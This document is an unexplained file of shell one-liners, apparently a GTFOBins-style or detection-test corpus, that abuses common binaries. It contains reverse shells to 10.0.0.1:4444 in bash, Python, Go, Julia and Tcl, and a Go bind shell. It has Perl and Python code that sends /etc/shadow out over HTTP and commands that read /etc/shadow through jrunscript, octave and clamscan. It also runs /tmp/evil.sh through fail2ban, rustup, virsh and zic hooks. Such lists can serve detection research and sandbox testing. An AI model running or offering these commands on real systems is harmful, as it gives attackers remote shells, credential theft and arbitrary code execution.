commands.command:
echo DATA >output-file
arj a x output-file
arj e x /tmp/outdir/

bash -c '{ echo -ne "GET /etc/shadow HTTP/1.0
host: 10.0.0.1

" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/10.0.0.1/4444 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "")" ] && break; done; cat; } >/tmp/evil'

touch x.yara
clamscan --no-summary -d x.yara -f /etc/shadow 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'

echo DATA >/tmp/tempfile
docker cp /tmp/tempfile $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /tmp/evil

dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /tmp/output

fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /tmp/evil.sh
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x

cat >/tmp/tempdir/fail2ban.conf <<EOF
[Definition]
EOF

cat >/tmp/tempdir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p /tmp/tempdir/action.d/
cat >/tmp/tempdir/action.d/x.conf <<EOF
[Definition]
actionstart = /tmp/evil.sh
EOF

mkdir -p /tmp/tempdir/filter.d/
cat >/tmp/tempdir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c /tmp/tempdir/ -v restart

echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 4444}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/tmp/tempfile.go
go run /tmp/tempfile.go

echo -e 'package main
import "os"
func main(){
	f, _ := os.OpenFile("/tmp/evil", os.O_RDWR|os.O_CREATE, 0644)
	f.Write([]byte("DATA\n"))
	f.Close()
}' >/tmp/tempfile.go
go run /tmp/tempfile.go

echo -e 'package main
import (
	"os"
	"net"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	ip := net.ParseIP("10.0.0.1").To4()
	addr := &syscall.SockaddrInet4{Port: 4444}
	copy(addr.Addr[:], ip)
	syscall.Connect(fd, addr)
	syscall.Dup2(fd, 0)
	syscall.Dup2(fd, 1)
	syscall.Dup2(fd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/tmp/tempfile.go
go run /tmp/tempfile.go

echo -n DATA | tee /usr/share/wordlists/rockyou.txt | md5sum | awk '{print $1}' >/tmp/hash.txt
hashcat -m 0 --quiet --potfile-disable -o /tmp/evil --outfile-format=2 --outfile-autohex-disable /tmp/hash.txt /usr/share/wordlists/rockyou.txt

iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /tmp/evil

jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/etc/shadow"));
    while ((line = br.readLine()) != null) { print(line); }'

julia -e 'using Sockets; sock=connect("10.0.0.1", parse(Int64, 4444)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
octave-cli --eval 'format none; fid = fopen("/etc/shadow"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'

perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"10.0.0.1",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /etc/shadow HTTP/1.1
Host: 10.0.0.1
Metadata: true
Connection: close

"; open(my $fh, ">", "/tmp/evil") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "
") { $in_content = 1; } } close($s); close($fh);'

perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"10.0.0.1", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/etc/shadow") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1
Host: 10.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: " . length($content) . "
Connection: close

";print $s $headers . $content;while (<$s>) { }close($s);'

python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://10.0.0.1/etc/shadow", "/tmp/evil")'

python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("10.0.0.1",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'

python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("http://10.0.0.1", open("/etc/shadow", "rb").read())'

python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", 4444), s.SimpleHTTPRequestHandler).serve_forever()'

redis-cli -h 127.0.0.1
config set dir /tmp/outdir/
config set dbfilename output-file
set x "DATA"
save

mkdir /tmp/tempdir/bin/
mkdir /tmp/tempdir/lib/
echo '/tmp/evil.sh' >/tmp/tempdir/bin/rustc
chmod +x /tmp/tempdir/bin/rustc
rustup toolchain link x /tmp/tempdir/
rustup run x rustc

echo DATA >/tmp/tempfile
tar cf /tmp/tempfile.tar /tmp/tempfile
tar Pxf /tmp/tempfile.tar --xform s@.*@/tmp/evil@

tclsh
set s [socket 10.0.0.1 4444];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;

cat >/tmp/tempfile.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/tmp/evil.sh'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /tmp/tempfile.xml
virsh -c qemu:///system destroy x

echo DATA >/tmp/tempfile

cat >/tmp/tempfile.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/tmp/outdir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/tmp/outdir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /tmp/outdir/
virsh -c qemu:///system vol-create --pool x --file /tmp/tempfile.xml
virsh -c qemu:///system vol-upload --pool x /tmp/outdir/output-file /tmp/tempfile
virsh -c qemu:///system pool-destroy x

virsh -c qemu:///system pool-create-as x dir --target /tmp/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x

wireshark -c 1 -i lo -k -f 'udp port 4444' &
echo DATA | nc -u 127.127.127.127 4444

echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/tmp/tempfile
echo 'Zone Test 2:00 Jordan CE%sT' >>/tmp/tempfile
zic -d . -y /tmp/evil.sh /tmp/tempfile
